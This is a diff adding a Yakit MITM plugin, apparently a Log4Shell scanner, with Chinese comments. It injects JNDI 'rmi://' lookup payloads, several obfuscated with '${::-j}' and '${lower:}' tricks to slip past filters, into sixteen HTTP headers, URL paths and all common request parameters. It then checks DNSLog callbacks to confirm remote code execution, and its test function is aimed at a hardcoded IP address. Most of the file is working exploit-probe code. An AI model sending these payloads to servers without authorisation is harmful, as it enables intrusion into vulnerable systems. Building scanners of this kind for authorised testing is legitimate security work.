@@ -1,0 +1,294 @@
+# mitm plugin template
+
+#-----------------------MITM Hooks I/O-------------------------
+/*
+#如何使用插件参数？
+
+## 例如，如果你设置了一个参数为 url_keyword 的参数，可以通过 MITM_PARAMS 来使用它！
+urlKeyword = MITM_PARAMS["url_keyword"]
+
+# 如何输出给 Yakit 给用户查看？
+
+yakit_output(i: any) // 可以只输出到 "Console 界面"
+yakit_save(i: any)   // 可以输出并保存到数据库中，在 "插件输出" 中查看
+*/
+#----------------MITM Hooks Test And Quick Debug-----------------
+/*
+# __test__ 是 yakit mitm 插件用于调试的函数 【注意：这个函数在 MITM hooks劫持环境下不会被导入】
+
+在这个函数中，你可以使用 yakit.GenerateYakitMITMHooksParams(method: string, url: string, opts ...http.Option) 来方便的生成可供 hooks 调用的参数，参考代码模版中的用法～
+
+*/
+
+
+#--------------------------WORKSPACE-----------------------------
+__test__ = func() {
+    isHttps = false
+    // 构建一个测试请求
+    rspRaw, reqRaw, err := poc.HTTP(`
+GET /hello?payload=1 HTTP/1.1
+Host: 123.58.236.76:36782
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 Firefox/95.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+
+idle=123`, poc.https(isHttps))
+    die(err)
+
+    // 从响应报文里拿body
+    body, _ := str.ExtractBodyFromHTTPResponseRaw(rspRaw)
+    // 从请求报文里拿url
+    url, _ := str.ExtractURLFromHTTPRequestRaw(reqRaw, isHttps)
+
+    results = [isHttps, url.String(), reqRaw, rspRaw, body]
+
+    // 直接触发hooks
+    // mirrorHTTPFlow(results...)
+    // mirrorFilteredHTTPFlow(results...)
+    mirrorNewWebsite(results...)
+    // mirrorNewWebsitePath(results...)
+    mirrorNewWebsitePathParams(results...)
+}
+
+headers = [
+    "X-Client-IP",
+    "X-Remote-IP",
+    "X-Remote-Addr",
+    "X-Forwarded-For",
+    "X-Originating-IP",
+    "User-Agent",
+    "Referer",
+    "CF-Connecting_IP",
+    "True-Client-IP",
+    "X-Real-IP",
+    "Contact",
+    "X-Wap-Profile",
+    "X-APi-Version",
+    "Content-Type",
+    "Accept",
+    "Content-Encoding",
+]
+
+payloads = [
+    "${jndi:rmi://%v/1}",
+    // "${jndi:${::-r}mi://%v/1}",
+    "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://%v/1}",
+    // "${${::-j}ndi:rmi://%v/1}",
+    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:r}${lower:m}${lower:i}://%v/1}",
+    // "${${lower:j}ndi: rmi://%v/1}",
+]
+
+// 创建一个token，返回host和port和token字符串
+// getNewToken = func() {
+//     token, hostPort, err := risk.NewRandomPortTrigger(risk.type("TCP反连"), risk.typeVerbose("RMI反连"), risk.
+//     title("Log4Shell反连"))
+//     if err != nil {
+//         yakit_output(err.Error())
+//     }
+//     if token == "" {
+//         yakit_output("未配置 Yak Bridge 作为公网映射，无法获取随机端口")
+//         continue
+//     }
+//     return token, hostPort
+// }
+
+httpFlow := 0
+hit := 0
+mirrorNewWebsite = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    httpFlow += 1
+    yakit_status("Log4j 扫描数", parseString(httpFlow))
+    // 创建一个fuzz请求
+    freq, err := fuzz.HTTPRequest(req)
+    if err != nil {
+        yakit_output("执行失败")
+        continue
+    }
+
+    host, port, _ = str.ParseStringToHostPort(url)
+    addr = str.HostPort(host, port)
+
+    // 在PATH中检测
+    wg = sync.NewWaitGroup()
+    wg.Add(2)
+    yakit_output("Checking log4j in path for " + addr)
+    go func() {
+        defer wg.Done()
+        defer fn{ err = recover(); if err != nil {yakit_output("Log4j Plugin ERROR: " + sprint(err))}}
+
+        pathFReq := freq
+        // 生成token与payload对应的map
+        pathPayload := make(map[string]string)
+        for _, payload := range payloads {
+            // 生成一个token和payload
+            hostPort, token, err := risk.NewDNSLogDomain()
+            if err != nil {
+                return
+            }
+
+            pathPayload[token] = sprintf("/%s", sprintf(payload, hostPort))
+        }
+
+        // 生成所有payload的请求，共五个。参数置空，GET请求测试
+        pathSlice := make([]string)
+        for _, path := range pathPayload {
+            pathSlice = append(pathSlice, path)
+        }
+
+        // pathFReq.FuzzMethod("GET").FuzzPath(pathSlice...).FuzzGetParamsRaw("").Show()
+        res, err := pathFReq.FuzzMethod("GET").FuzzPath(pathSlice...).FuzzGetParamsRaw("").Exec(httpool.https(isHttps))
+        if err != nil {
+            yakit_output("执行失败")
+            return
+        }
+
+        // res其实是一个channel，转成slice
+        // make([]interface{})
+        for result := range res {
+            yakit_output("Log4j Check Path: " + result.Url)
+        }
+
+        // 遍历token，判断是否成功
+        go func{
+            defer fn{ err = recover(); if err != nil {yakit_output("Log4j Plugin ERROR: " + sprint(err))}}
+
+            for token, payload := range pathPayload {
+                detail, err := risk.CheckDNSLogByToken(token)
+                if len(detail) > 0 {
+                    yakit_output("发现一个 Log4j 漏洞(路径检测)")
+                    risk.NewRisk(
+                        url, risk.severity("high"), risk.type("rce"),
+                        risk.title(sprintf("Log4j[DNSLog]: %v[path]", addr)),
+                        risk.payload(payload), risk.details({
+                            "path": "payload",
+                            "token": token,
+                        }),
+                        risk.token(token),
+                    )
+                    // yakit_output({
+                    //     "message": "发现一个 Log4Shell 漏洞",
+                    //     "url": sprintf("%v://%v/%v", url.Scheme, url.Host, payload[1:]),
+                    //     "payload": payload[1:],
+                    // })
+                    hit += 1
+                    yakit_status("Log4j 命中数量", parseString(hit))
+                    return
+                }
+            }
+            yakit_output("finished checking log4j in path for " + addr)
+        }
+    }()
+
+    yakit_output("Start to check log4j in payload: " + addr)
+    // 在Header头中检测
+    go func() {
+        defer wg.Done()
+        defer fn{ err = recover(); if err != nil {yakit_output("Log4j Plugin ERROR: " + sprint(err))}}
+
+        for _, payload := range payloads {
+            // 生成token与header对应的map
+
+            // 获取用于检测头的 Token
+            domain, token, err = risk.NewDNSLogDomain()
+            if err != nil {
+                continue
+            }
+            headerFReq := freq
+            formatedPayload := sprintf(payload, domain)
+            for _, header := range headers {
+                // 这里是链式调用
+                headerFReq = headerFReq.FuzzHTTPHeader(header, formatedPayload)
+            }
+
+            res, err := headerFReq.Exec(httpool.https(isHttps))
+            if err != nil {
+                yakit_output("执行失败(Log4j Header Checking): " + sprint(err))
+                return
+            }
+
+            go func{
+                finished = false
+                defer fn{ err = recover(); if err != nil {yakit_output("Log4j Plugin ERROR: " + sprint(err))}}
+                for result := range res {
+                    if finished {
+                        continue
+                    }
+                    yakit_output("Log4j Check Header: " + result.Url) 
+                    detail, err := risk.CheckDNSLogByToken(token)
+                    if len(detail) > 0 {
+                        risk.NewRisk(
+                            url, risk.severity("high"), risk.type("rce"),
+                            risk.title(sprintf("Log4j[DNSLog]: %v[header]", addr)),
+                            risk.payload(formatedPayload), risk.details({
+                                "request": result.RequestRaw,
+                                "response": result.ResponseRaw,
+                                "token": token,
+                            }),
+                            risk.token(token),
+                        )
+                        hit += 1
+                        yakit_status("Log4j 命中数量", parseString(hit))
+                        finished = true
+                    }
+                }
+            }
+        }
+    }()
+    wg.Wait()
+}
+
+# mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
+mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
+    httpFlow += 1
+    yakit_status("Log4j 扫描数", parseString(httpFlow))
+
+    freq, err := fuzz.HTTPRequest(req, fuzz.https(isHttps))
+    if err != nil {
+        yakit_output("执行失败")
+        continue
+    }
+
+    host, port, _ = str.ParseStringToHostPort(url)
+    addr = str.HostPort(host, port)
+
+    // 遍历所有参数
+    for _, param := range freq.GetCommonParams() { 
+        paramName := param.Name()
+        paramPosition := param.Position()
+
+        finished = false
+        for _, payload := range payloads {
+            if finished {
+                return
+            }
+
+            domain, token, err = risk.NewDNSLogDomain()
+            if err != nil {
+                continue
+            }
+
+            yakit_output("check log4j..." + domain)
+            // param.Fuzz(sprintf(payload, hostPort)).Show()
+            sentPayload = sprintf(payload, domain)
+            res, err := param.Fuzz(sentPayload).Exec(httpool.https(isHttps))
+            for result = range res {
+                yakit_output("check by token")
+                detail, err := risk.CheckDNSLogByToken(token)
+                if len(detail) > 0 {
+                    risk.NewRisk(
+                        url, risk.severity("high"), risk.type("rce"),
+                        risk.title(sprintf("Log4j[DNSLog]: %v[%v in %v]", addr, paramName, paramPosition)),
+                        risk.payload(sentPayload), risk.details({
+                            "url": url,
+                            "request": result.RequestRaw,
+                            "response": result.ResponseRaw,
+                            "domain": domain,
+                            "token": token,
+                        }),
+                        risk.token(token),
+                    )
+                    finished = true
+                }
+            }
+        }
+    }
+}
